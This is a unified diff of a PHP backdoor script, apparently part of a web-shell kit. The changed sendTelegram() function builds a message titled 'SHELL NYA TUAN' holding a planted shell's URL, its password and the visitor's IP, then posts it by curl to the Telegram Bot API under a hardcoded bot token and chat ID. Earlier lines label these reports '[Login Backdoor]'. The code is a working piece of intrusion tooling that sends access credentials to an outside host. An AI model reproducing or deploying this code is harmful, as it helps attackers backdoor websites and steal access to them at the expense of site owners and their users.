@@ -11,12 +11,23 @@ $botToken = '7940404768:AAGNTcNtiFbc5H_ZfkPLm-g1Sy2ywsjDbSo';
 $chatId = '-4794875087';
 
 // UTIL
-// UTIL
-function sendTelegram($text) {
+function sendTelegram($domain, $path, $file, $passwordInput) {
     global $botToken, $chatId;
     $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
-    $msg = urlencode("[Login Backdoor]\nIP: $ip\n$text");
-    @file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$msg");
+    $link = "https://$domain/$path/$file";
+    $msg = "SHELL NYA TUAN\nURL : $link\nPASS : $passwordInput\nIP : $ip";
+
+    $data = [
+        'chat_id' => $chatId,
+        'text' => $msg
+    ];
+
+    $ch = curl_init("https://api.telegram.org/bot$botToken/sendMessage");
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_exec($ch);
+    curl_close($ch);
 }
 function rand_str($len = 8) {
     return substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, $len);
